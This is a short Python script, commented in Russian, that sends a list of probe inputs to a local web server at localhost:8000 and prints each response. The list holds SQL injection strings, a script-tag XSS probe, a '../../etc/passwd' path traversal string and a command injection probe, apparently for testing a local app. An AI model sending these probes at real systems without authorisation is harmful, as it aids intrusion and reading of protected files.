import requests

payloads = [
    "1",                    # нормальный
    "1'",                   # SQLi проверка
    "1' OR '1'='1",         # SQLi всегда истина
    "1' AND '1'='2",       # SQLi всегда ложь
    "<script>alert(1)</script>",  # XSS
    "../../etc/passwd",     # Path Traversal
    "ls -la",              # Command Injection
]

for p in payloads:
    url = "http://localhost:8000/"
    print(f"\n{'='*50}")
    print(f"Payload: {repr(p)}")
    
    try:
        r = requests.get(url, params={'id': p}, timeout=3)
        print(f"Status: {r.status_code}")
        print(f"Response length: {len(r.text)} chars")
        
        # Выводим часть ответа
        if len(r.text) > 200:
            print("Response (first 200 chars):")
            print(r.text[:200])
        else:
            print("Response:")
            print(r.text)
    except Exception as e:
        print(f"Error: {e}")
